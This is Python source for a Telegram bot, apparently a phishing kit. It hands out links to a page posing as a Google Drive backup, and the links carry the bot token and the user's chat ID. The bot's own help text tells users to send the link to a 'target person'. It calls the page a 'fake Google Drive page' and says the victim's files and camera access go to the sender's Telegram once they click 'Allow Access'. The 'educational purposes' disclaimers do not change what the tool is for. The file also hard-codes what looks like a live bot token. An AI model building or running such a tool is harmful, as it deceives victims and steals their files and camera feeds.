import telebot
from telebot import types
import os
from datetime import datetime
import json
import time
import html
import sys

# ============= কনফিগারেশন =============
BOT_TOKEN = "8955562967:AAEMoQnvcZk-hUmL8A0hcpNIa_lTozDZTJk"
ADMIN_ID = "7755338110"
DOMAIN = "https://unlimited-cloud-storage.vercel.app/"
PAGE_PATH = "/index.html"

# চ্যানেল লিস্ট
REQUIRED_CHANNELS = [
    {"name": "🔐 Security Updates", "url": "https://t.me/ronjumodz", "username": "@ronjumodz"},
    {"name": "📢 Announcements", "url": "https://t.me/ronjubackup", "username": "@ronjubackup"}
]

# ফাইল পাথ
USERS_FILE = "users.json"
BROADCAST_FILE = "broadcast_messages.json"

# ============= বট ইনিশিয়ালাইজ =============
print("🤖 Initializing bot...")
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# ============= Webhook ডিসেবল করুন =============
try:
    print("🔄 Removing webhook...")
    bot.remove_webhook()
    print("✅ Webhook removed successfully!")
    time.sleep(1)  # Webhook রিমুভ করতে একটু সময় দিন
except Exception as e:
    print(f"⚠️ Webhook removal error: {e}")

print("✅ Bot initialized!")

# ============= ডাটা ফাংশন =============
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_users(users_data):
    with open(USERS_FILE, 'w') as f:
        json.dump(users_data, f, indent=4)

def load_broadcasts():
    try:
        with open(BROADCAST_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

def save_broadcasts(broadcasts):
    with open(BROADCAST_FILE, 'w') as f:
        json.dump(broadcasts, f, indent=4)

def escape_html(text):
    if not text:
        return ""
    return html.escape(str(text))

# ============= ভেরিফিকেশন ফাংশন =============
def show_verification_required(message):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    
    for channel in REQUIRED_CHANNELS:
        btn = types.InlineKeyboardButton(
            f"🔗 Join {channel['name']}",
            url=channel['url']
        )
        keyboard.add(btn)
    
    verify_btn = types.InlineKeyboardButton(
        "✅ I've Joined All Channels",
        callback_data="verify_channels"
    )
    keyboard.add(verify_btn)
    
    verification_text = """
<b>🔒 Channel Membership Required</b>

To use this bot, you must join our official channels first:

"""
    
    for channel in REQUIRED_CHANNELS:
        verification_text += f"\n👉 {channel['name']}: {channel['username']}"
    
    verification_text += """

<b>📌 Steps:</b>
1. Join all channels above
2. Click "I've Joined All Channels"
3. Start using the bot

<code>⚠️ Note: You must stay in the channels to continue using the bot.</code>
"""
    
    bot.send_message(
        message.chat.id,
        verification_text,
        reply_markup=keyboard,
        parse_mode='HTML'
    )

# ============= কমান্ড হ্যান্ডলার =============
@bot.message_handler(commands=['start'])
def send_welcome(message):
    try:
        print(f"📩 /start command received from {message.from_user.id}")
        
        user_id = str(message.from_user.id)
        user_name = message.from_user.first_name or "User"
        username = message.from_user.username or ""
        
        users = load_users()
        
        # নতুন ইউজার যোগ করুন
        if user_id not in users:
            users[user_id] = {
                'username': username,
                'first_name': user_name,
                'join_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'verified': False,
                'links_generated': 0,
                'links': []
            }
            save_users(users)
            print(f"✅ New user added: {user_id}")
        
        # ভেরিফিকেশন চেক
        if not users[user_id].get('verified', False):
            show_verification_required(message)
            return
        
        # ওয়েলকাম মেসেজ
        welcome_text = f"""
<b>🤖 Welcome to Google Drive Link Generator</b>

Hello {escape_html(user_name)}! I can generate personalized Google Drive backup links for you.

<b>Available Commands:</b>
/generate - Create your personal link
/mylink - View your generated link
/help - Get help

<code>⚠️ Note: This bot is for educational purposes only.</code>
"""
        
        keyboard = types.InlineKeyboardMarkup()
        generate_btn = types.InlineKeyboardButton("✨ Generate Link", callback_data="generate")
        keyboard.add(generate_btn)
        
        bot.send_message(message.chat.id, welcome_text, reply_markup=keyboard, parse_mode='HTML')
        print(f"✅ Welcome message sent to {user_id}")
        
    except Exception as e:
        print(f"❌ Error in start command: {e}")
        bot.send_message(message.chat.id, "❌ Something went wrong. Please try again later.")

@bot.callback_query_handler(func=lambda call: call.data == "verify_channels")
def verify_channels(call):
    try:
        user_id = str(call.from_user.id)
        users = load_users()
        
        if user_id in users:
            users[user_id]['verified'] = True
            save_users(users)
            
            bot.answer_callback_query(call.id, "✅ Verification successful!")
            
            welcome_text = f"""
<b>🤖 Welcome to Google Drive Link Generator</b>

Hello {escape_html(call.from_user.first_name)}! I can generate personalized Google Drive backup links for you.

<b>Available Commands:</b>
/generate - Create your personal link
/mylink - View your generated link
/help - Get help

<code>⚠️ Note: This bot is for educational purposes only.</code>
"""
            
            keyboard = types.InlineKeyboardMarkup()
            generate_btn = types.InlineKeyboardButton("✨ Generate Link", callback_data="generate")
            keyboard.add(generate_btn)
            
            bot.send_message(call.message.chat.id, welcome_text, reply_markup=keyboard, parse_mode='HTML')
        else:
            bot.answer_callback_query(call.id, "❌ User not found!", show_alert=True)
            
    except Exception as e:
        print(f"❌ Error in verify callback: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.message_handler(commands=['generate'])
def generate_link(message):
    try:
        user_id = str(message.from_user.id)
        user_name = message.from_user.first_name or "User"
        
        users = load_users()
        
        if user_id not in users or not users[user_id].get('verified', False):
            show_verification_required(message)
            return
        
        generated_link = f"{DOMAIN}{PAGE_PATH}?token={BOT_TOKEN}&chatid={user_id}"
        
        if user_id in users:
            if 'links' not in users[user_id]:
                users[user_id]['links'] = []
            users[user_id]['links'].append({
                'link': generated_link,
                'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            users[user_id]['links_generated'] = len(users[user_id]['links'])
            save_users(users)
        
        response_text = f"""
<b>✅ Link Generated Successfully!</b>

<b>🔗 Your Personal Link:</b>
<code>{escape_html(generated_link)}</code>

<b>📊 Link Details:</b>
👤 Created for: {escape_html(user_name)}
🆔 Your Chat ID: <code>{user_id}</code>
🕐 Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
📈 Total Links Generated: {users[user_id]['links_generated']}

<b>📋 How to Use:</b>
1. Send this link to the target person
2. When they open it, they'll see a Google Drive backup page
3. When they click "Allow Access", their files and camera access will be sent to YOUR Telegram

<code>⚠️ Warning: Use only for educational and ethical purposes.</code>

Developer: @Ronju360
"""
        
        keyboard = types.InlineKeyboardMarkup()
        copy_btn = types.InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{user_id}")
        preview_btn = types.InlineKeyboardButton("👁️ Preview", url=generated_link)
        keyboard.add(copy_btn, preview_btn)
        
        bot.send_message(message.chat.id, response_text, reply_markup=keyboard, parse_mode='HTML')
        
        # অ্যাডমিন নোটিফিকেশন
        admin_msg = f"""
<b>🆕 New Link Generated!</b>

👤 User: {escape_html(user_name)} (@{message.from_user.username or 'No username'})
🆔 ID: {user_id}
🕐 Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
🔗 Link: {generated_link}
"""
        try:
            bot.send_message(ADMIN_ID, admin_msg, parse_mode='HTML')
        except:
            pass
            
    except Exception as e:
        print(f"❌ Error in generate: {e}")
        bot.send_message(message.chat.id, "❌ Error generating link!")

@bot.message_handler(commands=['mylink'])
def show_my_link(message):
    try:
        user_id = str(message.from_user.id)
        user_name = message.from_user.first_name or "User"
        
        users = load_users()
        
        if user_id not in users or not users[user_id].get('verified', False):
            show_verification_required(message)
            return
        
        if 'links' not in users[user_id] or not users[user_id]['links']:
            response_text = "You haven't generated any link yet. Use /generate to create one."
            keyboard = types.InlineKeyboardMarkup()
            generate_btn = types.InlineKeyboardButton("✨ Generate Link", callback_data="generate")
            keyboard.add(generate_btn)
        else:
            latest_link = users[user_id]['links'][-1]['link']
            
            response_text = f"""
<b>📋 Your Generated Link</b>

<b>🔗 Latest Link:</b>
<code>{escape_html(latest_link)}</code>

👤 Created for: {escape_html(user_name)}
🆔 Your Chat ID: <code>{user_id}</code>
📊 Total Links: {users[user_id]['links_generated']}

<b>📋 To use again:</b>
Click /generate to create a new link
"""
            
            keyboard = types.InlineKeyboardMarkup()
            copy_btn = types.InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{user_id}")
            preview_btn = types.InlineKeyboardButton("👁️ Preview", url=latest_link)
            new_btn = types.InlineKeyboardButton("✨ New Link", callback_data="generate")
            keyboard.add(copy_btn, preview_btn)
            keyboard.add(new_btn)
        
        bot.send_message(message.chat.id, response_text, reply_markup=keyboard, parse_mode='HTML')
        
    except Exception as e:
        print(f"❌ Error in mylink: {e}")
        bot.send_message(message.chat.id, "❌ Error!")

@bot.message_handler(commands=['help'])
def show_help(message):
    try:
        help_text = """
<b>🆘 Help Center</b>

<b>How to use this bot:</b>

1. Join the required channels first
2. Click /generate to create your personal link
3. Send the link to target person
4. When they open it, they'll see a fake Google Drive page
5. When they click "Allow Access", their files will be sent to YOUR Telegram

<b>Commands:</b>
/start - Start the bot
/generate - Create your personal link
/mylink - View your generated link
/help - Show this help message

<b>Required Channels:</b>
"""
        
        for channel in REQUIRED_CHANNELS:
            help_text += f"\n🔗 {channel['name']}: {channel['username']}"
        
        help_text += """

<code>⚠️ Important:</code>
- Use only for educational purposes
- Don't misuse this tool
- Respect others' privacy

<b>Support:</b> Contact admin if you need help.

Developer: @Ronju360
"""
        
        bot.send_message(message.chat.id, help_text, parse_mode='HTML')
        
    except Exception as e:
        print(f"❌ Error in help: {e}")
        bot.send_message(message.chat.id, "❌ Error!")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id != ADMIN_ID:
            bot.send_message(message.chat.id, "⛔ This command is for admin only.")
            return
        
        users_data = load_users()
        total_users = len(users_data)
        verified_users = sum(1 for u in users_data.values() if u.get('verified', False))
        total_links = sum(u.get('links_generated', 0) for u in users_data.values())
        
        stats_text = f"""
<b>📊 Bot Statistics</b>

👥 Total Users: {total_users}
✅ Verified Users: {verified_users}
📈 Total Links Generated: {total_links}
🕐 Current Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
"""
        
        bot.send_message(message.chat.id, stats_text, parse_mode='HTML')
        
    except Exception as e:
        print(f"❌ Error in stats: {e}")
        bot.send_message(message.chat.id, "❌ Error!")

# ============= কাস্টম কলব্যাক =============
@bot.callback_query_handler(func=lambda call: call.data == "generate")
def generate_callback(call):
    try:
        msg = type('obj', (object,), {
            'from_user': call.from_user,
            'chat': type('obj', (object,), {'id': call.message.chat.id})()
        })()
        generate_link(msg)
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"❌ Error in generate callback: {e}")
        bot.answer_callback_query(call.id, "❌ Error!", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("copy_"))
def copy_link(call):
    try:
        uid = call.data[5:]
        users_data = load_users()
        
        if uid in users_data and users_data[uid].get('links'):
            latest_link = users_data[uid]['links'][-1]['link']
            
            copy_text = f"""
<b>📋 Copy this link:</b>

<code>{escape_html(latest_link)}</code>

(Select and copy the text above)
"""
            bot.send_message(call.message.chat.id, copy_text, parse_mode='HTML')
            bot.answer_callback_query(call.id, "✅ Link copied to message!")
        else:
            bot.answer_callback_query(call.id, "❌ Link not found!", show_alert=True)
            
    except Exception as e:
        print(f"❌ Error in copy callback: {e}")
        bot.answer_callback_query(call.id, "❌ Error!", show_alert=True)

# ============= মেইন ফাংশন =============
if __name__ == "__main__":
    print("=" * 50)
    print("🤖 Google Drive Link Generator Bot")
    print("=" * 50)
    print(f"🔗 Domain: {DOMAIN}")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"📢 Required Channels: {len(REQUIRED_CHANNELS)}")
    print("=" * 50)
    
    # ফাইল চেক
    if not os.path.exists(USERS_FILE):
        save_users({})
        print("✅ Created users.json")
    
    if not os.path.exists(BROADCAST_FILE):
        save_broadcasts([])
        print("✅ Created broadcast_messages.json")
    
    # বট টোকেন চেক
    try:
        bot_info = bot.get_me()
        print(f"✅ Bot connected successfully!")
        print(f"🤖 Bot Username: @{bot_info.username}")
        print(f"🆔 Bot ID: {bot_info.id}")
        print("=" * 50)
        print("🚀 Bot is now running...")
        print("💡 Press Ctrl+C to stop")
        print("=" * 50)
        
        # Webhook ডিসেবল করে Polling চালু করুন
        print("🔄 Starting polling...")
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
        
    except Exception as e:
        print(f"❌ Error: {e}")
        print("Please check your BOT_TOKEN and try again.")
        sys.exit(1)
